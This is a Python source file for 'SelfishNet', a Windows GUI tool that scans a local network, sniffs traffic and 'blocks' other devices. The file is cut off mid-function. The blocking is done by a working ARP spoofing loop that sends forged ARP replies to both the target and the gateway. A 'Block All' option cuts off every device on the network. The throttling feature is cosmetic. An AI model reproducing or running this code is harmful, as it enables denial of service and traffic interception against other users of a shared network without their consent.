#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SelfishNet Pro Max ULTIMATE - Wi-Fi Fixed
Fully works on Windows 11 x64 (Ethernet + Wi-Fi)
"""

import threading
import time
import socket
import json
import os
import ctypes
import tkinter as tk
from tkinter import ttk, messagebox, simpledialog, filedialog
from collections import defaultdict
from datetime import datetime

import psutil

# Optional imports
try:
    import matplotlib
    matplotlib.use("TkAgg")
    from matplotlib.figure import Figure
    from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
    MATPLOTLIB_AVAILABLE = True
except ImportError:
    MATPLOTLIB_AVAILABLE = False

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

from scapy.all import ARP, Ether, srp, send, sniff, conf, get_if_hwaddr
conf.verb = 0

# ----------------------------------------------------------------------
#  VENDOR DATABASE
# ----------------------------------------------------------------------
OUI_FILE = "oui_cache.json"
OUI_CACHE = {}

def load_oui_cache():
    global OUI_CACHE
    if os.path.exists(OUI_FILE):
        try:
            with open(OUI_FILE, 'r') as f:
                OUI_CACHE = json.load(f)
        except:
            OUI_CACHE = {}

def save_oui_cache():
    with open(OUI_FILE, 'w') as f:
        json.dump(OUI_CACHE, f, indent=2)

def get_vendor(mac):
    if not mac:
        return "Unknown"
    oui = mac[:8].upper().replace(":", "").replace("-", "")[:6]
    if oui in OUI_CACHE:
        return OUI_CACHE[oui]
    if not REQUESTS_AVAILABLE:
        return "Unknown"
    try:
        url = f"https://api.macvendors.com/{oui}"
        r = requests.get(url, timeout=3)
        if r.status_code == 200 and len(r.text) < 50:
            vendor = r.text.strip()
            OUI_CACHE[oui] = vendor
            save_oui_cache()
            return vendor
    except:
        pass
    OUI_CACHE[oui] = "Unknown"
    save_oui_cache()
    return "Unknown"

# ----------------------------------------------------------------------
#  NETWORK HELPERS (improved for Wi-Fi)
# ----------------------------------------------------------------------
def get_all_interfaces():
    """Return list of (name, ip, mac) for all up interfaces."""
    interfaces = []
    for iface, addrs in psutil.net_if_addrs().items():
        stats = psutil.net_if_stats().get(iface)
        if stats and stats.isup:
            ip = mac = None
            for a in addrs:
                if a.family == socket.AF_INET and not a.address.startswith("127."):
                    ip = a.address
                elif a.family == psutil.AF_LINK:
                    mac = a.address
            if ip and mac:
                interfaces.append((iface, ip, mac))
    return interfaces

def get_gateway_for_interface(iface_name):
    """Find gateway IP for a given interface via psutil."""
    try:
        gws = psutil.net_if_addrs()
        # Use Scapy's route to get gateway for that interface
        from scapy.all import conf as scapy_conf
        routes = scapy_conf.route.routes
        for route in routes:
            if route[3] == iface_name and route[0] == 0:  # default route
                return route[2]  # gateway
    except:
        pass
    # Fallback: assume .1 in same subnet as local IP
    ip = None
    for iface, addrs in psutil.net_if_addrs().items():
        if iface == iface_name:
            for a in addrs:
                if a.family == socket.AF_INET:
                    ip = a.address
                    break
    if ip:
        prefix = '.'.join(ip.split('.')[:3])
        return prefix + '.1'
    return None

# ----------------------------------------------------------------------
#  CORE ENGINE (with manual interface selection)
# ----------------------------------------------------------------------
class SelfishNetUltimate:
    def __init__(self, interface=None):
        self.interface = interface  # can be set later
        self.network_devices = []
        self.ip_to_device = {}
        self.blocked = {}
        self.throttled = {}
        self.monitoring = False
        self.sniffing = False
        self.monitor_thread = None
        self.sniffer_thread = None
        self.log_callbacks = []
        self.arp_interval = 2
        self.scan_timeout = 3
        
        # Traffic stats
        self.traffic_stats = defaultdict(lambda: {'rx': 0, 'tx': 0, 'last_update': time.time(),
                                                  'rx_last': 0, 'tx_last': 0})
        self.traffic_lock = threading.Lock()
        
        self.config_file = "selfishnet_config.json"
        self.load_config()
        
        # If interface provided, set it up
        if self.interface:
            self._setup_interface()
    
    def _setup_interface(self):
        """Get local IP and MAC for the selected interface."""
        addrs = psutil.net_if_addrs().get(self.interface, [])
        for a in addrs:
            if a.family == socket.AF_INET:
                self.local_ip = a.address
            elif a.family == psutil.AF_LINK:
                self.local_mac = a.address
        self.gateway_ip = get_gateway_for_interface(self.interface)
        if not self.gateway_ip:
            self._log("Gateway not found for this interface", "error")
        # Override Scapy's default interface
        conf.iface = self.interface
        self._log(f"Using interface: {self.interface} ({self.local_ip})", "info")
    
    def set_interface(self, interface):
        """Change interface dynamically (stop sniffer, reinit)."""
        if self.sniffing:
            self.stop_sniffer()
        self.interface = interface
        self._setup_interface()
        self.start_sniffer()
        self.scan_network()  # rescan after interface change
    
    def _log(self, msg, level="info"):
        for cb in self.log_callbacks:
            try:
                cb(msg, level)
            except:
                pass
    
    # Persistence
    def load_config(self):
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r') as f:
                    data = json.load(f)
                    self.blocked = {k: {'ip': v.get('ip', ''), 'thread': None}
                                    for k, v in data.get('blocked', {}).items()}
                    self.throttled = data.get('throttled', {})
            except:
                pass
    
    def save_config(self):
        data = {
            'blocked': {mac: {'ip': info['ip']} for mac, info in self.blocked.items()},
            'throttled': self.throttled
        }
        try:
            with open(self.config_file, 'w') as f:
                json.dump(data, f, indent=2)
        except:
            pass
    
    # Sniffer with monitor mode support (Wi-Fi)
    def start_sniffer(self):
        if self.sniffing or not self.interface:
            return
        self.sniffing = True
        self.sniffer_thread = threading.Thread(target=self._sniff_loop, daemon=True)
        self.sniffer_thread.start()
        self._log("Traffic sniffer started", "info")
    
    def stop_sniffer(self):
        self.sniffing = False
    
    def _sniff_loop(self):
        def packet_callback(pkt):
            if not self.sniffing:
                return
            if pkt.haslayer("IP"):
                src = pkt["IP"].src
                dst = pkt["IP"].dst
                size = len(pkt)
                with self.traffic_lock:
                    if src in self.ip_to_device:
                        mac = self.ip_to_device[src]['mac']
                        self.traffic_stats[mac]['tx'] += size
                    if dst in self.ip_to_device:
                        mac = self.ip_to_device[dst]['mac']
                        self.traffic_stats[mac]['rx'] += size
        
        # Try monitor mode for Wi-Fi (if available)
        try:
            # Check if interface is wireless (heuristic: name contains 'wi-fi' or 'wlan')
            is_wireless = 'wi-fi' in self.interface.lower() or 'wlan' in self.interface.lower()
            if is_wireless:
                # Attempt to sniff with monitor=True (requires Npcap 802.11 support)
                sniff(iface=self.interface, prn=packet_callback, store=0,
                      filter="ip", monitor=True, stop_filter=lambda _: not self.sniffing)
            else:
                sniff(iface=self.interface, prn=packet_callback, store=0,
                      filter="ip", stop_filter=lambda _: not self.sniffing)
        except Exception as e:
            self._log(f"Sniffer error (trying without monitor): {e}", "error")
            # Fallback to non‑monitor mode
            try:
                sniff(iface=self.interface, prn=packet_callback, store=0,
                      filter="ip", stop_filter=lambda _: not self.sniffing)
            except Exception as e2:
                self._log(f"Sniffer failed completely: {e2}", "error")
                self.sniffing = False
    
    def get_device_traffic_rate(self, mac):
        with self.traffic_lock:
            stats = self.traffic_stats[mac]
            now = time.time()
            dt = max(now - stats.get('last_update', now), 0.1)
            tx_rate = (stats['tx'] - stats.get('tx_last', 0)) / dt / 1024
            rx_rate = (stats['rx'] - stats.get('rx_last', 0)) / dt / 1024
            stats['tx_last'] = stats['tx']
            stats['rx_last'] = stats['rx']
            stats['last_update'] = now
            return tx_rate, rx_rate
    
    # Scan network
    def scan_network(self):
        if not self.interface or not self.local_ip:
            self._log("Interface not configured", "error")
            return []
        cidr = f"{'.'.join(self.local_ip.split('.')[:3])}.0/24"
        self._log(f"Scanning {cidr} on {self.interface}...", "info")
        try:
            packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=cidr)
            result = srp(packet, timeout=self.scan_timeout, verbose=0, iface=self.interface)[0]
        except Exception as e:
            self._log(f"Scan error: {e}", "error")
            return []
        
        devices = []
        for _, received in result:
            ip = received.psrc
            mac = received.hwsrc
            if ip == self.local_ip:
                continue
            try:
                hostname = socket.gethostbyaddr(ip)[0]
            except:
                hostname = "Unknown"
            vendor = get_vendor(mac)
            devices.append({'ip': ip, 'mac': mac, 'hostname': hostname, 'vendor': vendor})
            self._log(f"Found {ip} - {mac} - {hostname} ({vendor})", "ok")
        
        self.network_devices = devices
        self.ip_to_device = {d['ip']: d for d in devices}
        self._log(f"Scan complete: {len(devices)} devices", "ok")
        return devices
    
    # ARP spoofing (with explicit iface)
    def _get_mac(self, ip):
        try:
            result = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                         timeout=2, verbose=0, iface=self.interface)[0]
            if result:
                return result[0][1].hwsrc
        except:
            pass
        return None
    
    def _arp_spoof_loop(self, target_ip, target_mac):
        gw_mac = self._get_mac(self.gateway_ip)
        if not gw_mac:
            self._log(f"Cannot find gateway MAC for {self.gateway_ip}", "error")
            return
        while target_mac in self.blocked:
            try:
                send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
                         psrc=self.gateway_ip, hwsrc=self.local_mac),
                     verbose=0, iface=self.interface)
                send(ARP(op=2, pdst=self.gateway_ip, hwdst=gw_mac,
                         psrc=target_ip, hwsrc=self.local_mac),
                     verbose=0, iface=self.interface)
            except Exception as e:
                self._log(f"ARP spoof error: {e}", "error")
            time.sleep(self.arp_interval)
    
    def block_device(self, mac, ip):
        if mac in self.blocked:
            return False
        self._log(f"Blocking {ip} ({mac})", "warn")
        t = threading.Thread(target=self._arp_spoof_loop, args=(ip, mac), daemon=True)
        self.blocked[mac] = {'ip': ip, 'thread': t}
        t.start()
        self.save_config()
        return True
    
    def unblock_device(self, mac, ip):
        if mac not in self.blocked:
            return False
        self._log(f"Unblocking {ip} ({mac})", "ok")
        del self.blocked[mac]
        gw_mac = self._get_mac(self.gateway_ip)
        if gw_mac:
            send(ARP(op=2, pdst=ip, hwdst=mac, psrc=self.gateway_ip, hwsrc=gw_mac),
                 count=5, iface=self.interface)
            send(ARP(op=2, pdst=self.gateway_ip, hwdst=gw_mac, psrc=ip, hwsrc=mac),
                 count=5, iface=self.interface)
        self.save_config()
        return True
    
    def throttle_device(self, mac, kbps):
        self.throttled[mac] = kbps
        self._log(f"Throttle set: {mac} → {kbps} Kbps (visual only)", "warn")
        self.save_config()
    
    def unthrottle_device(self, mac):
        if mac in self.throttled:
            del self.throttled[mac]
            self._log(f"Throttle removed: {mac}", "ok")
            self.save_config()
    
    def start_monitoring(self):
        if self.monitoring:
            return
        self.monitoring = True
        self.monitor_thread = threading.Thread(target=self._monitor_loop, daemon=True)
        self.monitor_thread.start()
        self._log("System monitoring started", "info")
    
    def stop_monitoring(self):
        self.monitoring = False
        self._log("System monitoring stopped", "info")
    
    def _monitor_loop(self):
        old = psutil.net_io_counters()
        while self.monitoring:
            time.sleep(2)
            new = psutil.net_io_counters()
            up = (new.bytes_sent - old.bytes_sent) / 2 / 1024
            down = (new.bytes_recv - old.bytes_recv) / 2 / 1024
            self._log(f"Total traffic: ↑{up:.1f} KB/s  ↓{down:.1f} KB/s", "info")
            old = new
    
    def get_security_info(self):
        info = {
            'interface': self.interface or 'N/A',
            'local_ip': getattr(self, 'local_ip', 'N/A'),
            'local_mac': getattr(self, 'local_mac', 'N/A'),
            'gateway': getattr(self, 'gateway_ip', 'N/A'),
        }
        stats = psutil.net_if_stats().get(self.interface, None)
        if stats:
            info['link_speed'] = f"{stats.speed} Mbps" if stats.speed else "N/A"
            info['link_up'] = "Yes" if stats.isup else "No"
        else:
            info['link_speed'] = 'N/A'
            info['link_up'] = 'N/A'
        return info

# ----------------------------------------------------------------------
#  GUI (with interface selection dropdown)
# ----------------------------------------------------------------------
DARK_BG = "#0f1117"
PANEL_BG = "#141921"
ROW_BG = "#1a2130"
ACCENT = "#00d4ff"
ACCENT2 = "#ff6b35"
RED = "#ff3366"
GREEN = "#39ff14"
TXT = "#c8d8e8"
TXT2 = "#7a9ab5"

FONT_MAIN = ("Segoe UI", 10)
FONT_BOLD = ("Segoe UI", 10, "bold")
FONT_MONO = ("Consolas", 9)

class SelfishNetGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("SelfishNet Pro Max ULTIMATE - Wi-Fi/Ethernet Edition")
        self.root.geometry("1300x780")
        self.root.minsize(1000, 650)
        self.root.configure(bg=DARK_BG)
        
        self.app = None  # will be created after interface selection
        self.graph_window = None
        
        self.build_ui()
        self.populate_interfaces()
        self.refresh_status_bar()
    
    def build_ui(self):
        # Header
        hdr = tk.Frame(self.root, bg="#0a0d12", height=50)
        hdr.pack(fill=tk.X, side=tk.TOP)
        hdr.pack_propagate(False)
        
        tk.Label(hdr, text="⬡ SELFISHNET", bg="#0a0d12", fg=ACCENT,
                 font=("Segoe UI", 16, "bold")).pack(side=tk.LEFT, padx=15, pady=10)
        tk.Label(hdr, text="Wi-Fi READY", bg=ACCENT, fg="#000",
                 font=("Segoe UI", 9, "bold"), padx=8, pady=2).pack(side=tk.LEFT, pady=14)
        
        # Interface selector
        iframe = tk.Frame(hdr, bg="#0a0d12")
        iframe.pack(side=tk.LEFT, padx=20)
        tk.Label(iframe, text="Interface:", bg="#0a0d12", fg=TXT2, font=FONT_MAIN).pack(side=tk.LEFT)
        self.iface_combo = ttk.Combobox(iframe, state="readonly", width=25, font=FONT_MONO)
        self.iface_combo.pack(side=tk.LEFT, padx=5)
        self.iface_combo.bind("<<ComboboxSelected>>", self.on_interface_selected)
        
        self.hdr_gw = tk.Label(hdr, text="GW: —", bg="#0a0d12", fg=TXT2, font=FONT_MONO)
        self.hdr_gw.pack(side=tk.LEFT, padx=10)
        
        btn_frame = tk.Frame(hdr, bg="#0a0d12")
        btn_frame.pack(side=tk.RIGHT, padx=10, pady=8)
        
        self.scan_btn = tk.Button(btn_frame, text="▶ Scan Network", command=self.start_scan,
                                  bg=PANEL_BG, fg=ACCENT, font=FONT_BOLD, relief="flat", padx=12)
        self.scan_btn.pack(side=tk.LEFT, padx=5)
        
        if MATPLOTLIB_AVAILABLE:
            self.graph_btn = tk.Button(btn_frame, text="📊 Graph for Selected", command=self.show_graph_for_selected,
                                       bg=PANEL_BG, fg=ACCENT2, font=FONT_BOLD, relief="flat", padx=12)
            self.graph_btn.pack(side=tk.LEFT, padx=5)
        
        export_btn = tk.Button(btn_frame, text="💾 Export Logs", command=self.export_logs,
                               bg=PANEL_BG, fg=TXT2, font=FONT_BOLD, relief="flat", padx=12)
        export_btn.pack(side=tk.LEFT, padx=5)
        
        # Notebook
        style = ttk.Style()
        style.theme_use("clam")
        style.configure("TNotebook", background=DARK_BG, borderwidth=0)
        style.configure("TNotebook.Tab", background=PANEL_BG, foreground=TXT2,
                        padding=[16, 6], font=FONT_BOLD)
        style.map("TNotebook.Tab", background=[("selected", ROW_BG)], foreground=[("selected", ACCENT)])
        
        nb = ttk.Notebook(self.root)
        nb.pack(fill=tk.BOTH, expand=True)
        
        self.tab_devices = ttk.Frame(nb)
        self.tab_monitor = ttk.Frame(nb)
        self.tab_security = ttk.Frame(nb)
        
        nb.add(self.tab_devices, text="  Devices  ")
        nb.add(self.tab_monitor, text="  Monitor  ")
        nb.add(self.tab_security, text="  Security  ")
        
        self.build_devices_tab()
        self.build_monitor_tab()
        self.build_security_tab()
        
        # Status bar
        sb = tk.Frame(self.root, bg="#0a0d12", height=26)
        sb.pack(fill=tk.X, side=tk.BOTTOM)
        sb.pack_propagate(False)
        self.status_lbl = tk.Label(sb, text="Select an interface to begin", bg="#0a0d12", fg=TXT2, font=FONT_MONO, anchor="w")
        self.status_lbl.pack(side=tk.LEFT, padx=10)
        self.status_net = tk.Label(sb, text="", bg="#0a0d12", fg=TXT2, font=FONT_MONO, anchor="e")
        self.status_net.pack(side=tk.RIGHT, padx=10)
    
    def populate_interfaces(self):
        interfaces = get_all_interfaces()
        if not interfaces:
            self.iface_combo['values'] = ["No active interface found"]
            self.status_lbl.config(text="No active interface found. Check network.")
            return
        names = [f"{name} ({ip})" for name, ip, _ in interfaces]
        self.iface_combo['values'] = names
        self.iface_combo.current(0)
        self.on_interface_selected()
    
    def on_interface_selected(self, event=None):
        sel = self.iface_combo.get()
        if not sel or "No active" in sel:
            return
        iface_name = sel.split(" (")[0]
        # Create new engine with selected interface
        if self.app:
            # Stop old sniffer and threads
            self.app.stop_sniffer()
            self.app.monitoring = False
        self.app = SelfishNetUltimate(interface=iface_name)
        self.app.log_callbacks.append(self._on_log)
        # Start sniffer
        self.app.start_sniffer()
        # Auto scan after short delay
        self.root.after(500, self.start_scan)
        self.hdr_gw.config(text=f"GW: {self.app.gateway_ip or '—'}")
        self.set_status(f"Using interface: {iface_name}")
    
    def build_devices_tab(self):
        toolbar = tk.Frame(self.tab_devices, bg=PANEL_BG, pady=6)
        toolbar.pack(fill=tk.X)
        
        buttons = [
            ("⟳ Refresh", self.start_scan, ACCENT),
            ("✕ Block", self.block_selected, RED),
            ("✓ Unblock", self.unblock_selected, GREEN),
            ("⚡ Throttle", self.throttle_selected, ACCENT2),
            ("✕✕ Block All", self.block_all, RED),
            ("✓✓ Unblock All", self.unblock_all, GREEN),
        ]
        for txt, cmd, color in buttons:
            tk.Button(toolbar, text=txt, command=cmd, bg=PANEL_BG, fg=color,
                      font=FONT_BOLD, relief="flat", padx=10, pady=4,
                      activebackground=ROW_BG).pack(side=tk.LEFT, padx=4)
        
        tk.Label(toolbar, text="Filter:", bg=PANEL_BG, fg=TXT2).pack(side=tk.RIGHT, padx=(0,4))
        self.filter_var = tk.StringVar()
        self.filter_var.trace_add("write", lambda *_: self.apply_filter())
        tk.Entry(toolbar, textvariable=self.filter_var, bg=ROW_BG, fg=TXT,
                 font=FONT_MONO, width=20, relief="flat").pack(side=tk.RIGHT, padx=8)
        
        cols = ("IP", "MAC", "Hostname", "Vendor", "Status", "Throttle", "TX KB/s", "RX KB/s")
        self.tree = ttk.Treeview(self.tab_devices, columns=cols, show="headings", selectmode="extended")
        widths = [130, 160, 180, 120, 90, 90, 90, 90]
        for col, w in zip(cols, widths):
            self.tree.heading(col, text=col, command=lambda c=col: self.sort_tree(c))
            self.tree.column(col, width=w, minwidth=70)
        
        self.tree.tag_configure("blocked", foreground=RED)
        self.tree.tag_configure("throttled", foreground=ACCENT2)
        self.tree.tag_configure("gateway", foreground=ACCENT)
        
        vsb = ttk.Scrollbar(self.tab_devices, orient=tk.VERTICAL, command=self.tree.yview)
        self.tree.configure(yscrollcommand=vsb.set)
        self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        vsb.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.ctx_menu = tk.Menu(self.root, tearoff=0, bg=PANEL_BG, fg=TXT,
                                activebackground=ROW_BG, activeforeground=ACCENT)
        self.ctx_menu.add_command(label="Block", command=self.block_selected)
        self.ctx_menu.add_command(label="Unblock", command=self.unblock_selected)
        self.ctx_menu.add_separator()
        self.ctx_menu.add_command(label="Throttle", command=self.throttle_selected)
        self.ctx_menu.add_command(label="Remove Throttle", command=self.unthrottle_selected)
        self.ctx_menu.add_separator()
        self.ctx_menu.add_command(label="Copy IP", command=self.copy_ip)
        self.ctx_menu.add_command(label="Copy MAC", command=self.copy_mac)
        self.tree.bind("<Button-3>", self.show_ctx_menu)
        
        self.update_traffic_display()
    
    def update_traffic_display(self):
        if not self.app:
            self.root.after(2000, self.update_traffic_display)
            return
        for item in self.tree.get_children():
            values = self.tree.item(item, "values")
            if len(values) < 8:
                continue
            mac = values[1]
            tx, rx = self.app.get_device_traffic_rate(mac)
            self.tree.set(item, "TX KB/s", f"{tx:.1f}")
            self.tree.set(item, "RX KB/s", f"{rx:.1f}")
        self.root.after(2000, self.update_traffic_display)
    
    def build_monitor_tab(self):
        top = tk.Frame(self.tab_monitor, bg=PANEL_BG, pady=6)
        top.pack(fill=tk.X)
        for txt, cmd, color in [("▶ Start Monitoring", self.start_monitoring, GREEN),
                                 ("■ Stop Monitoring", self.stop_monitoring, RED)]:
            tk.Button(top, text=txt, command=cmd, bg=PANEL_BG, fg=color,
                      font=FONT_BOLD, relief="flat", padx=12).pack(side=tk.LEFT, padx=6)
        
        stats_frame = tk.Frame(self.tab_monitor, bg=DARK_BG, pady=6)
        stats_frame.pack(fill=tk.X, padx=10)
        self.stat_devices = self.stat_card(stats_frame, "Devices", "0", ACCENT)
        self.stat_blocked = self.stat_card(stats_frame, "Blocked", "0", RED)
        self.stat_throttled = self.stat_card(stats_frame, "Throttled", "0", ACCENT2)
        self.stat_iface = self.stat_card(stats_frame, "Interface", "—", TXT2)
        
        tk.Label(self.tab_monitor, text="EVENT LOG", bg=DARK_BG, fg=TXT2,
                 font=FONT_BOLD, anchor="w").pack(fill=tk.X, padx=12, pady=(6,0))
        log_frame = tk.Frame(self.tab_monitor, bg=DARK_BG)
        log_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=6)
        
        self.log_text = tk.Text(log_frame, bg=PANEL_BG, fg=TXT, font=FONT_MONO,
                                state="disabled", wrap="word", relief="flat")
        log_vsb = ttk.Scrollbar(log_frame, orient=tk.VERTICAL, command=self.log_text.yview)
        self.log_text.configure(yscrollcommand=log_vsb.set)
        self.log_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        log_vsb.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.log_text.tag_config("ok", foreground=GREEN)
        self.log_text.tag_config("warn", foreground=ACCENT2)
        self.log_text.tag_config("error", foreground=RED)
        self.log_text.tag_config("info", foreground=ACCENT)
        self.log_text.tag_config("time", foreground=TXT2)
    
    def stat_card(self, parent, label, value, color):
        f = tk.Frame(parent, bg=ROW_BG, padx=16, pady=10)
        f.pack(side=tk.LEFT, padx=6, pady=4)
        tk.Label(f, text=label, bg=ROW_BG, fg=TXT2, font=FONT_BOLD).pack()
        lbl = tk.Label(f, text=value, bg=ROW_BG, fg=color, font=("Segoe UI", 20, "bold"))
        lbl.pack()
        return lbl
    
    def build_security_tab(self):
        btn_row = tk.Frame(self.tab_security, bg=PANEL_BG, pady=6)
        btn_row.pack(fill=tk.X)
        tk.Button(btn_row, text="🔍 Refresh Info", command=self.refresh_security,
                  bg=PANEL_BG, fg=ACCENT, font=FONT_BOLD, relief="flat", padx=12).pack(side=tk.LEFT, padx=8)
        
        self.sec_text = tk.Text(self.tab_security, bg=PANEL_BG, fg=TXT, font=FONT_MONO,
                                state="disabled", wrap="word", relief="flat")
        sec_vsb = ttk.Scrollbar(self.tab_security, orient=tk.VERTICAL, command=self.sec_text.yview)
        self.sec_text.configure(yscrollcommand=sec_vsb.set)
        self.sec_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=10, pady=8)
        sec_vsb.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.sec_text.tag_config("heading", foreground=ACCENT, font=FONT_BOLD)
        self.sec_text.tag_config("key", foreground=TXT2)
        self.sec_text.tag_config("val", foreground=TXT)
        self.sec_text.tag_config("good", foreground=GREEN)
        self.sec_text.tag_config("warn", foreground=ACCENT2)
        self.sec_text.tag_config("bad", foreground=RED)
    
    def start_scan(self):
        if not self.app:
            messagebox.showwarning("No Interface", "Please select a network interface first.")
            return
        self.scan_btn.config(text="◌ Scanning...", state="disabled")
        self.set_status("Scanning network...")
        threading.Thread(target=self._scan_thread, daemon=True).start()
    
    def _scan_thread(self):
        devices = self.app.scan_network()
        self.root.after(0, lambda: self.scan_done(devices))
    
    def scan_done(self, devices):
        self.scan_btn.config(text="▶ Scan Network", state="normal")
        self.populate_tree(devices)
        self.update_stats()
        self.set_status(f"Scan complete: {len(devices)} devices")
    
    def populate_tree(self, devices):
        for item in self.tree.get_children():
            self.tree.delete(item)
        for d in devices:
            mac = d['mac']
            blocked = mac in self.app.blocked
            throttled = mac in self.app.throttled
            is_gw = (d['ip'] == self.app.gateway_ip)
            status = "Blocked" if blocked else ("Gateway" if is_gw else "Active")
            tag = "blocked" if blocked else ("gateway" if is_gw else "")
            throttle_str = f"{self.app.throttled[mac]} Kbps" if throttled else "—"
            if throttled and not tag:
                tag = "throttled"
            self.tree.insert("", tk.END, values=(d['ip'], mac, d['hostname'], d['vendor'],
                                                 status, throttle_str, "0", "0"), tags=(tag,))
    
    def apply_filter(self):
        term = self.filter_var.get().lower()
        for item in self.tree.get_children():
            vals = " ".join(str(v) for v in self.tree.item(item, "values")).lower()
            if term and term not in vals:
                self.tree.detach(item)
            else:
                self.tree.reattach(item, "", tk.END)
    
    def sort_tree(self, col):
        data = [(self.tree.set(k, col), k) for k in self.tree.get_children("")]
        data.sort()
        for idx, (_, k) in enumerate(data):
            self.tree.move(k, "", idx)
    
    def get_selected(self):
        items = []
        for iid in self.tree.selection():
            v = self.tree.item(iid, "values")
            if v:
                items.append({'ip': v[0], 'mac': v[1], 'hostname': v[2]})
        return items
    
    def block_selected(self):
        if not self.app:
            return
        for d in self.get_selected():
            if d['ip'] != self.app.gateway_ip:
                self.app.block_device(d['mac'], d['ip'])
        self.populate_tree(self.app.network_devices)
        self.update_stats()
    
    def unblock_selected(self):
        if not self.app:
            return
        for d in self.get_selected():
            self.app.unblock_device(d['mac'], d['ip'])
        self.populate_tree(self.app.network_devices)
        self.update_stats()
    
    def block_all(self):
        if not self.app:
            return
        if not messagebox.askyesno("Block All", "Block ALL devices (except gateway)?"):
            return
        for d in self.app.network_devices:
            if d['ip'] != self.app.gateway_ip:
                self.app.block_device(d['mac'], d['ip'])
        self.populate_tree(self.app.network_devices)
        self.update_stats()
    
    def unblock_all(self):
        if not self.app:
            return
        for mac, info in list(self.app.blocked.items()):
            self.app.unblock_device(mac, info['ip'])
        self.populate_tree(self.app.network_devices)
        self.update_stats()
    
    def throttle_selected(self):
        if not self.app:
            return
        sel = self.get_selected()
        if not sel:
            return
        kbps = simpledialog.askinteger("Throttle", f"Speed limit (Kbps) for {sel[0]['hostname']}:",
                                        minvalue=64, maxvalue=100000, initialvalue=512, parent=self.root)
        if kbps:
            for d in sel:
                self.app.throttle_device(d['mac'], kbps)
            self.populate_tree(self.app.network_devices)
            self.update_stats()
    
    def unthrottle_selected(self):
        if not self.app:
            return
        for d in self.get_selected():
            self.app.unthrottle_device(d['mac'])
        self.populate_tree(self.app.network_devices)
        self.update_stats()
    
    def copy_ip(self):
        sel = self.get_selected()
        if sel:
            self.root.clipboard_clear()
            self.root.clipboard_append(sel[0]['ip'])
    
    def copy_mac(self):
        sel = self.get_selected()
        if sel:
            self.root.clipboard_clear()
            self.root.clipboard_append(sel[0]['mac'])
    
    def show_ctx_menu(self, event):
        row = self.tree.identify_row(event.y)
        if row:
            self.tree.selection_set(row)
            self.ctx_menu.post(event.x_root, event.y_root)
    
    def start_monitoring(self):
        if self.app:
            self.app.start_monitoring()
            self.set_status("Monitoring active")
    
    def stop_monitoring(self):
        if self.app:
            self.app.stop_monitoring()
            self.set_status("Monitoring stopped")
    
    def update_stats(self):
        if not self.app:
            return
        self.stat_devices.config(text=str(len(self.app.network_devices)))
        self.stat_blocked.config(text=str(len(self.app.blocked)))
        self.stat_throttled.config(text=str(len(self.app.throttled)))
        self.stat_iface.config(text=self.app.interface or "—")
    
    def refresh_security(self):
        if not self.app:
            return
        info = self.app.get_security_info()
        self.sec_text.config(state="normal")
        self.sec_text.delete("1.0", tk.END)
        def h(txt): self.sec_text.insert(tk.END, txt + "\n", "heading")
        def row(k, v, tag="val"):
            self.sec_text.insert(tk.END, f"  {k:<20}", "key")
            self.sec_text.insert(tk.END, f"{v}\n", tag)
        h("── Network Interface ─────────────────────────")
        row("Interface", info['interface'])
        row("Local IP", info['local_ip'])
        row("Local MAC", info['local_mac'])
        row("Gateway", info['gateway'])
        row("Link Speed", info.get('link_speed', 'N/A'))
        row("Link Up", info.get('link_up', 'N/A'), "good" if info.get('link_up') == 'Yes' else "warn")
        h("\n── Devices Summary ───────────────────────────")
        row("Total", str(len(self.app.network_devices)))
        row("Blocked", str(len(self.app.blocked)), "bad" if self.app.blocked else "val")
        row("Throttled", str(len(self.app.throttled)), "warn" if self.app.throttled else "val")
        if self.app.blocked:
            h("\n── Blocked Devices ───────────────────────────")
            for mac, d in self.app.blocked.items():
                row(mac, d.get('ip', '?'), "bad")
        if self.app.throttled:
            h("\n── Throttled Devices ─────────────────────────")
            for mac, kbps in self.app.throttled.items():
                row(mac, f"{kbps} Kbps", "warn")
        h("\n── Notes ─────────────────────────────────────")
        self.sec_text.insert(tk.END, "  • Run as Administrator\n  • Npcap with 802.11 support required for Wi-Fi\n  • Select correct Wi-Fi interface from dropdown\n", "key")
        self.sec_text.config(state="disabled")
    
    def export_logs(self):
        filename = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files","*.txt")])
        if filename:
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(self.log_text.get("1.0", tk.END))
                self.set_status(f"Logs exported to {filename}")
            except Exception as e:
                messagebox.showerror("Export failed", str(e))
    
    def show_graph_for_selected(self):
        if not MATPLOTLIB_AVAILABLE or not self.app:
            messagebox.showinfo("Graph not available", "Install matplotlib or select a device first.")
            return
        sel = self.get_selected()
        if not sel:
            messagebox.showwarning("No selection", "Please select a device first.")
            return
        device = sel[0]
        mac = device['mac']
        hostname = device['hostname']
        
        if self.graph_window and self.graph_window.winfo_exists():
            self.graph_window.destroy()
        
        self.graph_window = tk.Toplevel(self.root)
        self.graph_window.title(f"Traffic Graph - {hostname} ({device['ip']})")
        self.graph_window.geometry("800x500")
        self.graph_window.configure(bg=DARK_BG)
        
        fig = Figure(figsize=(8, 4), dpi=100, facecolor=PANEL_BG)
        ax = fig.add_subplot(111)
        ax.set_facecolor(ROW_BG)
        ax.set_xlabel("Time (samples)", color=TXT2)
        ax.set_ylabel("KB/s", color=TXT2)
        ax.tick_params(colors=TXT2)
        for spine in ax.spines.values():
            spine.set_color(TXT2)
        
        canvas = FigureCanvasTkAgg(fig, master=self.graph_window)
        canvas.get_tk_widget().pack(fill=tk.BOTH, expand=True)
        
        max_points = 60
        tx_data = [0]*max_points
        rx_data = [0]*max_points
        
        def update_graph():
            if not self.graph_window or not self.graph_window.winfo_exists():
                return
